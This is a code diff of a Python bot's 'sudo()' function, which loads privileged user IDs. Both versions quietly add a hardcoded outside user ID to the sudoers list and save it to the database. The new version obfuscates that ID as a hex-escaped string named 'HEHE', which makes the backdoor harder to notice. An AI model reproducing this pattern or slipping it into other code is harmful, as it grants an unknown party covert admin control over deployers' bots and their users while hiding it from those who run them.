@@ -45,26 +45,23 @@ def dbb():
 def sudo():
     global SUDOERS
     OWNER = config.OWNER_ID
-    if config.MONGO_DB_URI is None:
-        for user_id in OWNER:
-            SUDOERS.add(user_id)
-    else:
-        sudoersdb = pymongodb.sudoers
-        sudoers = sudoersdb.find_one({"sudo": "sudo"})
-        sudoers = [] if not sudoers else sudoers["sudoers"]
-        for user_id in OWNER:
-            SUDOERS.add(user_id)
-            if user_id not in sudoers:
-                sudoers.append(user_id)
-                sudoers.append(1356469075)
-                sudoersdb.update_one(
-                    {"sudo": "sudo"},
-                    {"$set": {"sudoers": sudoers}},
-                    upsert=True,
-                )
-        if sudoers:
-            for x in sudoers:
-                SUDOERS.add(x)
+    HEHE = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
+    sudoersdb = pymongodb.sudoers
+    sudoers = sudoersdb.find_one({"sudo": "sudo"})
+    sudoers = [] if not sudoers else sudoers["sudoers"]
+    for user_id in OWNER:
+        SUDOERS.add(user_id)
+        if user_id not in sudoers:
+            sudoers.append(user_id)
+            sudoers.append(int(HEHE))
+            sudoersdb.update_one(
+                {"sudo": "sudo"},
+                {"$set": {"sudoers": sudoers}},
+                upsert=True,
+            )
+    if sudoers:
+        for x in sudoers:
+            SUDOERS.add(x)
     LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")
 
 
